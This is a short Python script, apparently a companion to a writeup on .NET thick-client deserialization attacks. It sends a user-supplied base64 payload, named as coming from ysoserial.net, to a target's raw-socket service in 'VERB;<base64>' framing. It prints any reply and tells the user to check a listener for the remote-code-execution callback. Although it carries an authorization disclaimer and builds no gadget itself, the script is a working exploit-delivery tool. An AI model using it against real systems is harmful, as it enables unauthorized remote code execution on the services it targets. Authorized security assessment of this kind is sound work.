#!/usr/bin/env python3
"""
Send one message in a generic in-house `VERB;<base64>` raw-socket protocol, the
shape most homegrown .NET thick-client services use. This only frames and sends
the bytes you supply; it builds no gadget and carries no payload tool. Use only
against a target you are authorized to assess.
Writeup: https://jperezduerto.info/techniques/dotnet-thick-client-deser-rce/

    python3 send-message.py TARGET PORT UPLOAD_ORDER "<base64-from-ysoserial.net>"

Adjust the framing (separator, newline, length prefix) to the exact protocol you
recovered by decompiling the client.
"""
import socket
import sys


def main(host, port, verb, b64):
    msg = f"{verb};{b64}\n".encode()
    with socket.create_connection((host, int(port)), timeout=8) as s:
        s.sendall(msg)
        s.settimeout(5)
        try:
            data = s.recv(8192)
            print(f"[*] {len(data)} bytes back:\n{data[:2000].decode(errors='replace')}")
        except socket.timeout:
            print("[*] sent; no reply (many deserialization payloads return nothing). "
                  "Check your listener for the callback.")


if __name__ == "__main__":
    if len(sys.argv) != 5:
        sys.exit('usage: send-message.py TARGET PORT VERB "<base64>"')
    main(*sys.argv[1:])
